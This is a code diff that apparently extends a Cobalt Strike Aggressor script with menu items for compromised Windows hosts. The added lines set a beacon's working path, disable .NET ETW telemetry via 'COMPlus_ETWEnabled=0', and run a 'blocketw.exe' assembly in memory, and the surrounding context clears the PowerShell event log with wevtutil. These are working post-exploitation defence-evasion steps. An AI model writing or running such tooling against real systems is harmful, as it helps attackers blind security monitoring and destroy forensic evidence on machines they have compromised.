@@ -89,7 +89,30 @@ menu "System Command" {
 			bshell(@ids, "wevtutil cl \"windows powershell\"");
         }, @ids => $1));
     }	
+				
+				item "Set beacon path" {
+				$bid = $1;
+				$dialog = dialog("Set beacon path", %(Path => "C:\\Windows\\Temp\\", bid => $bid), &beacon_path);
+				drow_text($dialog, "Path",  "Path: "); 	
+				dbutton_action($dialog, "SET");
+				dialog_show($dialog);
+        }
+sub beacon_path {
 
+    bcd($bid, $3['Path']);
+    }
+	
+menu "Hide .NET behavior" {
+			item "CMD command" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "set COMPlus_ETWEnabled=0");
+			}
+		}
+				item "blocketw" {
+					bexecute_assembly($1, script_resource("/script/blocketw.exe"), "");
+		}
+		}
 
 
 
